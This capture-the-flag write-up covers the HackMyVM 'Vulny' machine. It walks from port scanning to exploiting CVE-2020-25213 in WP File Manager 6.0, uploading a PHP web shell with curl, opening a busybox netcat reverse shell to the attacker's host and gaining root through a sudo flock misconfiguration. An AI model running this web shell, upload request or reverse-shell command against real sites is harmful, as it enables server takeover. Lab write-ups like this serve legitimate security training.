# Vulny

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Vulny | sml | Beginner | HackMyVM |

**Summary:** Vulny is a beginner-friendly machine featuring a WordPress installation with a critical file manager vulnerability. The attack path involves exploiting CVE-2020-25213 in WP File Manager 6.0, which allows unauthenticated arbitrary file upload leading to remote code execution. After gaining initial access as www-data, privilege escalation is achieved through a hardcoded password found in WordPress configuration files and finally to root via a misconfigured sudo permission for the flock binary.

---

## Reconnaissance

### Network Discovery

The initial reconnaissance phase began with network scanning to identify the target machine within the network range.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.51 08:00:27:7E:B4:45 VirtualBox
```

The scan identified the target at IP address 192.168.100.51 running on VirtualBox infrastructure.

### Port Scanning

A comprehensive Nmap scan was performed to identify open services and potential attack vectors.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ nmap -sC -sV -p- 192.168.100.51
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 17:50 WIB
Nmap scan report for 192.168.100.51
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx  MySQL X protocol listener

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.58 seconds
```

The scan revealed two open ports:
- **Port 80**: Apache HTTP Server 2.4.41 running on Ubuntu
- **Port 33060**: MySQL X Protocol listener

### Web Application Analysis

Accessing the web server on port 80 revealed the default Apache2 Ubuntu installation page, confirming the service was operational.

![webserver apache2](image.png)

### Directory Enumeration

Using Gobuster to discover hidden directories and potential attack surfaces:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ gobuster dir -u http://192.168.100.51/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.51/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 321] [--> http://192.168.100.51/javascript/]
/secret               (Status: 301) [Size: 317] [--> http://192.168.100.51/secret/]
/server-status        (Status: 403) [Size: 279]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

Three directories were discovered:
- `/javascript` - Returned 403 Forbidden
- `/secret` - Accessible and potentially interesting
- `/server-status` - Standard Apache status page (403 Forbidden)

Attempting to access the `/javascript` directory confirmed access restrictions:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ curl http://192.168.100.51/javascript/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.100.51 Port 80</address>
</body></html>
```

### WordPress Discovery

Investigating the `/secret` directory revealed important information about a WordPress installation:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ curl http://192.168.100.51/secret/
Neither <b>/etc/wordpress/config-192.168.100.51.php</b> nor <b>/etc/wordpress/config-168.100.51.php</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username. 
```

This error message indicated a WordPress installation with missing or misconfigured database connection files. Further enumeration of the `/secret` directory was performed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ gobuster dir -u http://192.168.100.51/secret/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,php.bak,txt,zip,old
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.51/secret/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php.bak,txt,zip,old,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 328] [--> http://192.168.100.51/secret/wp-content/]
/wp-includes          (Status: 301) [Size: 329] [--> http://192.168.100.51/secret/wp-includes/]
/wp-admin             (Status: 301) [Size: 326] [--> http://192.168.100.51/secret/wp-admin/]
```

Standard WordPress directories were discovered, confirming the presence of a WordPress installation.

### WordPress Directory Analysis

Examining each discovered WordPress directory:

**wp-content directory:**
![alt text](image-1.png)

The wp-content directory listing revealed several subdirectories including:
- languages/ (2020-10-15 11:01)
- plugins/ (2020-10-15 11:11)
- themes/ (2020-10-15 11:01)
- upgrade/ (2020-10-15 11:02)
- uploads/ (2020-10-15 11:02)

**wp-includes directory:**
![alt text](image-2.png)

**wp-admin directory:**
![alt text](image-3.png)

### Critical File Discovery

Investigation of the uploads directory revealed a potentially vulnerable plugin:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ wget http://192.168.100.51/secret/wp-content/uploads/2020/10/wp-file-manager-6.O.zip
--2026-01-30 18:09:05--  http://192.168.100.51/secret/wp-content/uploads/2020/10/wp-file-manager-6.O.zip
Connecting to 192.168.100.51:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3675008 (3.5M) [application/zip]
Saving to: 'wp-file-manager-6.O.zip'

wp-file-manager-6.O.zip   100%[==================================>]   3.50M   541KB/s    in 11s

2026-01-30 18:09:16 (330 KB/s) - 'wp-file-manager-6.O.zip' saved [3675008/3675008]
```

The discovery of wp-file-manager-6.0 was significant as this version is known to be vulnerable to CVE-2020-25213.

---

## Vulnerability Analysis

### CVE-2020-25213 - WP File Manager Unauthenticated File Upload

The WP File Manager version 6.0 contains a critical vulnerability allowing unauthenticated arbitrary file upload leading to remote code execution. The vulnerability exists in:
`/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`

**Key vulnerability characteristics:**

1. **Authentication Bypass:**
   - No wp_verify_nonce() check
   - No is_user_logged_in() validation  
   - No current_user_can() permission check
   - Direct access without WordPress authentication

2. **Dangerous Configuration:**
   - `'uploadAllow' => array('all')` - Allows all file types including PHP
   - Accepts `cmd=upload` parameter via HTTP request
   - No file type restrictions on uploads

### Vulnerability Confirmation

Testing if the vulnerable endpoint was accessible:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ curl -I http://192.168.100.51/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
HTTP/1.1 200 OK
Date: Fri, 30 Jan 2026 11:22:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=8bi6ds6ondb41l6dlog3q67oqf; path=/
Content-Length: 27
Content-Type: application/json; charset=utf-8
```

The endpoint returned a 200 OK status, confirming the vulnerable component was active and accessible.

---

## Initial Access

### Payload Preparation

A PHP web shell was created to exploit the file upload vulnerability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ vim cmd.php

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ cat cmd.php
<?php system($_GET['c']); ?>
```

### Exploit Execution

The malicious PHP file was uploaded using the vulnerable endpoint:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ curl -X POST 'http://192.168.100.51/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php' -F 'cmd=upload' -F 'target=l1_Lw' -F 'upload[]=@cmd.php'
{"added":[{"isowner":false,"ts":1769772660,"mime":"text\/x-php","read":1,"write":1,"size":"29","hash":"l1_Y21kLnBocA","name":"cmd.php","phash":"l1_Lw","url":"\/secret\/wp-content\/plugins\/wp-file-manager\/lib\/php\/..\/files\/cmd.php"}],"removed":["l1_Y21kLnBocA"],"changed":[{"isowner":false,"ts":1769772169,"mime":"directory","read":1,"write":1,"size":0,"hash":"l1_Lw","name":"files","rootRev":"","options":{"path":"","url":"","tmbUrl":"","disabled":[],"separator":"\/","copyOverwrite":1,"uploadOverwrite":1,"uploadMaxSize":9223372036854775807,"uploadMaxConn":3,"uploadMime":{"firstOrder":"deny","allow":["all"],"deny":["all"]},"dispInlineRegex":"^(?:(?:video|audio)|image\/(?!.+\\+xml)|application\/(?:ogg|x-mpegURL|dash\\+xml)|(?:text\/plain|application\/pdf)$)","jpgQuality":100,"archivers":{"create":[],"extract":[],"createext":[]},"uiCmdMap":[],"syncChkAsTs":1,"syncMinMs":0,"i18nFolderName":0,"tmbCrop":1,"tmbReqCustomData":false,"substituteImg":true,"onetimeUrl":true,"trashHash":"t1_Lw","csscls":"elfinder-navbar-root-local"},"volumeid":"l1_","locked":1,"isroot":1,"phash":""}]}
```

### Remote Code Execution Verification

Testing the uploaded web shell for command execution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ curl 'http://192.168.100.51/secret/wp-content/plugins/wp-file-manager/lib/files/cmd.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command executed successfully, confirming remote code execution as the `www-data` user.

### Reverse Shell

Setting up a netcat listener for the reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Executing the reverse shell payload (URL encoded):
`busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fsh`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ curl 'http://192.168.100.51/secret/wp-content/plugins/wp-file-manager/lib/files/cmd.php?c=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fsh'
```

### Shell Stabilization

Upgrading to a fully interactive shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59557
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
<ress/wp-content/plugins/wp-file-manager/lib/files$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulny]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

<ress/wp-content/plugins/wp-file-manager/lib/files$ cd /
www-data@vulny:/$
```

---

## Lateral Movement

### System Enumeration

Exploring the system to identify potential privilege escalation paths:

```bash
www-data@vulny:/$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Oct 15  2020 .
drwxr-xr-x 20 root   root   4096 Oct 15  2020 ..
drwxr-xr-x  4 adrian adrian 4096 Oct 15  2020 adrian
```

A user named `adrian` was identified on the system.

```bash
www-data@vulny:/$ cd /home/adrian
www-data@vulny:/home/adrian$ ls -la
total 36
drwxr-xr-x 4 adrian adrian 4096 Oct 15  2020 .
drwxr-xr-x 3 root   root   4096 Oct 15  2020 ..
-rw------- 1 adrian adrian   51 Oct 15  2020 .Xauthority
-rw-r--r-- 1 adrian adrian  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 adrian adrian 3771 Feb 25  2020 .bashrc
drwx------ 2 adrian adrian 4096 Oct 15  2020 .cache
drwxrwxr-x 3 adrian adrian 4096 Oct 15  2020 .local
-rw-r--r-- 1 adrian adrian  807 Feb 25  2020 .profile
-rw-r--r-- 1 adrian adrian    0 Oct 15  2020 .sudo_as_admin_successful
-rw------- 1 adrian adrian   16 Oct 15  2020 user.txt
```

The presence of `.sudo_as_admin_successful` indicated that adrian had sudo privileges.

### Password Discovery

Examining WordPress configuration files for credentials:

```bash
www-data@vulny:/usr/share/wordpress$ cat wp-config.php
<?php
/***
 * WordPress's Debianised default master config file
 * Please do NOT edit and learn how the configuration works in
 * /usr/share/doc/wordpress/README.Debian
 ***/

/* Look up a host-specific config file in
 * /etc/wordpress/config-<host>.php or /etc/wordpress/config-<domain>.php
 */
$debian_server = preg_replace('/:.*/', "", $_SERVER['HTTP_HOST']);
$debian_server = preg_replace("/[^a-zA-Z0-9.\-]/", "", $debian_server);
$debian_file = '/etc/wordpress/config-'.strtolower($debian_server).'.php';
/* Main site in case of multisite with subdomains */
$debian_main_server = preg_replace("/^[^.]*\./", "", $debian_server);
$debian_main_file = '/etc/wordpress/config-'.strtolower($debian_main_server).'.php';

if (file_exists($debian_file)) {
    require_once($debian_file);
    define('DEBIAN_FILE', $debian_file);
} elseif (file_exists($debian_main_file)) {
    require_once($debian_main_file);
    define('DEBIAN_FILE', $debian_main_file);
} elseif (file_exists("/etc/wordpress/config-default.php")) {
    require_once("/etc/wordpress/config-default.php");
    define('DEBIAN_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither <b>$debian_file</b> nor <b>$debian_main_file</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username.";
    exit(1);
}

/* idr[REDACTED] */

/* Default value for some constants if they have not yet been set
   by the host-specific config files */
if (!defined('ABSPATH'))
    define('ABSPATH', '/usr/share/wordpress/');
if (!defined('WP_CORE_UPDATE'))
    define('WP_CORE_UPDATE', false);
if (!defined('WP_ALLOW_MULTISITE'))
    define('WP_ALLOW_MULTISITE', true);
if (!defined('DB_NAME'))
    define('DB_NAME', 'wordpress');
if (!defined('DB_USER'))
    define('DB_USER', 'wordpress');
if (!defined('DB_HOST'))
    define('DB_HOST', 'localhost');
if (!defined('WP_CONTENT_DIR') && !defined('DONT_SET_WP_CONTENT_DIR'))
    define('WP_CONTENT_DIR', '/var/lib/wordpress/wp-content');

/* Default value for the table_prefix variable so that it doesn't need to
   be put in every host-specific config file */
if (!isset($table_prefix)) {
    $table_prefix = 'wp_';
}

if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')
    $_SERVER['HTTPS'] = 'on';

require_once(ABSPATH . 'wp-settings.php');
?>
```

A password was discovered in the comments section of the WordPress configuration file (marked as REDACTED for security purposes). This password was used to escalate privileges to the adrian user.

### User Privilege Escalation

Using the discovered credentials to switch to the adrian user:

```bash
www-data@vulny:/usr/share/wordpress$ su - adrian
Password:
adrian@vulny:~$ id
uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

Successfully escalated to the adrian user account, confirming sudo group membership.

---

## Privilege Escalation

### Sudo Enumeration

Checking sudo permissions for the adrian user:

```bash
adrian@vulny:~$ sudo -l
Matching Defaults entries for adrian on vulny:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on vulny:
    (ALL : ALL) NOPASSWD: /usr/bin/flock
```

The adrian user could execute `/usr/bin/flock` with sudo privileges without a password.

```bash
adrian@vulny:~$ ls -la /usr/bin/flock
-rwxr-xr-x 1 root root 35128 Apr  2  2020 /usr/bin/flock
```

### GTFOBins Research

Consulting GTFOBins for flock exploitation methods:

![flock](image-4.png)

The GTFOBins entry for flock confirmed that it could be used to spawn an interactive system shell when executed with sudo privileges.

### Root Privilege Escalation

Exploiting the flock binary to gain root access:

```bash
adrian@vulny:~$ sudo /usr/bin/flock / /bin/bash
root@vulny:/home/adrian# id
uid=0(root) gid=0(root) groups=0(root)
```

Successfully achieved root privileges through the flock sudo misconfiguration.

### Flag Collection

Retrieving both user and root flags:

```bash
root@vulny:/home/adrian# cd
root@vulny:~# cat /home/adrian/user.txt /root/root.txt
HMViu[REDACTED]
HMVid[REDACTED]
```

Both flags were successfully obtained, completing the machine compromise.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning and identified target at 192.168.100.51 with Apache HTTP server and MySQL services
2. **Vulnerability Discovery**: Discovered WordPress installation in `/secret` directory with vulnerable WP File Manager 6.0 plugin susceptible to CVE-2020-25213
3. **Exploitation**: Uploaded malicious PHP web shell through unauthenticated file upload vulnerability, achieving remote code execution as www-data
4. **Internal Enumeration**: Explored system, identified adrian user, and discovered hardcoded password in WordPress configuration file comments
5. **Privilege Escalation**: Escalated to adrian user using discovered credentials, then exploited sudo flock permission to gain root access via GTFOBins technique